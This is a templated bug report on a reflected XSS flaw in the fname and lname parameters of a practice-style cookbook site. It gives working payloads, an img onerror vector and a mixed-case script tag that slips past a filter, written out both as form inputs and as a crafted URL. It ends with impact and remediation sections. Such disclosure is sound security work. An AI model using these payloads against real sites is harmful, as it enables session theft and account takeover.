## Title
Reflected XSS - Multi-Parameter Script Filter Evasion
<!-- Write a short, clear title describing the vulnerability and where it was found. Example: Stored XSS in User Profile -->

## Description
**Affected URL:** https://cookbook.pwnedbox.site/
<!-- Explain what the vulnerability is, where it exists, and why it is a security issue. Include the affected URL or endpoint. -->
A Reflected Cross-Site Scripting (XSS) vulnerability exists within the fname and lname GET parameters at cookbook.pwnedbox.site. The application reflects user-supplied input directly inside HTML input value attributes without proper context-aware encoding. Due to weak input filtering, standard script tags in fname are completely stripped, requiring an alternative <img> vector, whereas lname bypasses case-sensitive blocks using a mixed-case <scRipt> tag. An attacker can use double quotes and closing brackets (">) to break out of the attribute boundaries and execute arbitrary JavaScript.
## Steps to Reproduce
<!-- Provide clear, numbered steps so another person can reproduce the issue. Include required requests, parameters, and actions. -->
1.Navigate to [http://cookbook.pwnedbox.site/](http://cookbook.pwnedbox.site/).   

2.Enter s@t"><img src=x onerror=alert('First')> into the First Name field and s@t"><scRipt>alert("Last")</scriPt> into the Last Name field and click Submit.   

3.Alternatively, navigate directly to the vulnerable URL: [http://cookbook.pwnedbox.site/?fname=s%40t%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27First%27%29%3E&lname=s%40t%22%3E%3CscRipt%3Ealert%28%22Last%22%29%3C%2FscriPt%3E](http://cookbook.pwnedbox.site/?fname=s%40t%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27First%27%29%3E&lname=s%40t%22%3E%3CscRipt%3Ealert%28%22Last%22%29%3C%2FscriPt%3E).   

4.Observe the execution of JavaScript alert dialogs. 
## POC (Proof of Concept)
<!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
1.Input form populated with the exact payloads.

  fname: s@t"><img src=x onerror=alert('First')> 
  
  lname: s@t"><scRipt>alert("Last")</scriPt>

<img width="1920" height="972" alt="1" src="https://github.com/user-attachments/assets/2d323b0a-e359-4f81-96af-50b9ce8fa49e" />


2.Execution of the JavaScript alert dialogs upon page load:

<img width="1920" height="968" alt="2" src="https://github.com/user-attachments/assets/dd475b22-661a-4bfb-a867-2922f05db018" />

<img width="1920" height="968" alt="3" src="https://github.com/user-attachments/assets/81e47a3d-e794-419e-967a-41dc3c53ec03" />


## Impact
<!-- Explain what an attacker could achieve, who could be affected, and the realistic security consequences. -->
Successful exploitation allows an attacker to execute arbitrary JavaScript within a victim's browser session via malicious links. This can lead to session token theft, account takeover, unauthorized actions performed on behalf of the user, and DOM-based phishing attacks.
## Remediation
<!-- Suggest specific steps to fix the vulnerability. Include secure coding practices or configuration changes where appropriate. -->
## Remediation
1.Implement strict context-aware HTML attribute encoding (converting characters like `"` to `&quot;`, `'` to `&#x27;`, and `<` to `&lt;`) for all reflected user input.
2.Avoid reliance on fragile blacklist filters or signature stripping for input validation.
3.Deploy a strict Content Security Policy (CSP) header restricting inline script execution (`unsafe-inline`).
